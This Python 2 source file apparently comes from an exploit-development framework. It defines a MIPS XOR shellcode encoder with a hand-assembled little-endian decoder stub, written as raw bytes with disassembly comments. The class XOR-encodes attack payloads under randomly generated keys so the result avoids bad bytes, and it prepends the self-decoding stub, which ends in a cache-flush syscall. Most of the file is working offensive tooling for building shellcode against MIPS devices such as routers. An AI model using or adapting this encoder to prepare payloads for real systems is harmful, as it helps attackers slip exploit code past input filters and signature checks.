import string
import random
import struct

from xorencoder import XorEncoder
from ..common.support import BigEndian,LittleEndian

class MipsXorEncoder(XorEncoder):
    MAX_ATTEMPTS=10
    decoders={}
    decoders[LittleEndian] = string.join([ 
        "SIZ2SIZ1\x0e\x24",    # li t6,-5
        "\x27\x70\xc0\x01",    # nor	t6,t6,zero
        "\xa3\xff\x0b\x24",    # li	t3,-93
        "\x26\x40\xce\x01",    # xor	t0,t6,t6
        "\xff\xff\x08\x21",    # addi	t0,t0,-1
        "\xff\xff\x10\x05",    # bltzal	t0,14 <next>
        "\x82\x82\x08\x28",    # slti	t0,zero,-32126
        "\xe2\xff\xfd\x23",    # addi	sp,ra,-30
        "\x27\x58\x60\x01",    # nor	t3,t3,zero
        "\x21\xc8\xeb\x03",    # addu	t9,ra,t3
        "\x82\x82\x17\x28",    # slti	s7,zero,-32126
        "\xfc\xff\x31\x8f",    # lw	s1,-4(t9)
        "\xfb\xff\x0c\x24",    # li	t4,-5
        "\x27\x60\x80\x01",    # nor	t4,t4,zero
        "\xfd\xff\x8f\x21",    # addi	t7,t4,-3
        "\xfc\xff\x28\x8f",    # lw	t0,-4(t9)
        "\x21\xb8\xef\x02",    # addu	s7,s7,t7
        "\x26\x18\x11\x01",    # xor	v1,t0,s1
        "\x2b\xf0\xee\x02",    # sltu	s8,s7,t6
        "\xfc\xff\x23\xaf",    # sw	v1,-4(t9)
        "\xfa\xff\x1e\x14",    # bne	zero,s8,3c <loop>
        "\x21\xc8\x2c\x03",    # addu	t9,t9,t4
        "\xfd\xff\x86\x21",    # addi	a2,t4,-3
        "\xf8\xff\xa6\xaf",    # sw	a2,-8(sp)
        "\x26\x28\xce\x01",    # xor	a1,t6,t6
        "\xfc\xff\xa5\xaf",    # sw	a1,-4(sp)
        "\xf8\xff\xa4\x27",    # addiu	a0,sp,-8
        "\x46\x10\x02\x24",    # li v0,4166
        "\x0c\x54\x4a\x01"     # syscall   0x52950
        ],'')
    
    def __has_badchars__(self,data,badchars):
        badchar_list=[]
        for char in badchars:
            #print "Checking for char: "+str(char)
            if chr(char) in data:
                badchar_list.append(char)

        return badchar_list

    def __parse_badchars__(self,badchars):
        badchar_list=[]
        for item in badchars:
            if type(item)==int:
                badchar_list.append(item)
            else:
                if type(item) == str:
                    parts=list(item)
                    for part in parts:
                        badchar_list.append(ord(part))
        
        return badchar_list
    
    #TODO: Does this need to be moved to superclass?
    def __generate_key__(self,triedkeys):
        minbyte=0x01
        maxbyte=0xff
        key=0
        random.seed()
        
        #keep trying until we find an original key
        while True:
            print "Generating key."
            for i in range(0,4):
                byte=random.randint(minbyte,maxbyte)
                key=key | byte << (i * 8) 
                #print "Key: %#010x" % key
            if self.endianness==BigEndian:
                key=struct.pack('>I',key)
            else:
                key=struct.pack('<I',key)

            if not key in triedkeys:
                break
        
        return key


    def __init__(self,payload,endianness,badchars=[],key=None):
        
        self.endianness=endianness
        self.badchars=self.__parse_badchars__(badchars)
        print "bad char count: %d" % len(self.badchars)
        generate_key=False
        
        self.key=key

        if len(payload.shellcode) % 4 != 0:
            raise "Payload length must be a multiple of 4 bytes."
        
        size=(len(payload.shellcode)/4)+1
        if size > 0xffff:
            raise "Payload length %d is too long." % len(payload.shellcode)
        
        size = size ^ 0xffff
        
        sizelo=size & 0xff
        sizehi=size >> 8

        decoder=self.__class__.decoders[endianness]
        decoder=decoder.replace("SIZ1",chr(sizehi))
        decoder=decoder.replace("SIZ2",chr(sizelo)) #SIZ1SIZ2 == sizehisizelo
        decoder_badchars=self.__has_badchars__(decoder,self.badchars)

        if len(decoder_badchars) > 0:
            raise Exception("Decoder stub contains bad bytes: %s" % str(decoder_badchars))
        print "No bad bytes in decoder stub."

        if not self.key:
            attempts=self.__class__.MAX_ATTEMPTS
        else:
            attempts=1
        
        tried_keys=[self.key]

        while attempts > 0:
            if not self.key:
                self.key=self.__generate_key__(tried_keys)
                tried_keys.append(self.key)
            
            encoded_shellcode=self.encode(payload.shellcode,self.key)
            encoded_badchars=self.__has_badchars__(encoded_shellcode,self.badchars)

            if len(encoded_badchars) > 0:
                self.key=None
                attempts -= 1
            else:
                break
        
        if not self.key:
            raise Exception("Failed to encode payload without bad bytes.")

        self.shellcode=decoder+self.key+encoded_shellcode

    def __str__(self):
        data=""
        for c in self.shellcode:
            data=data+"\\%c" % ord(c)

        return data

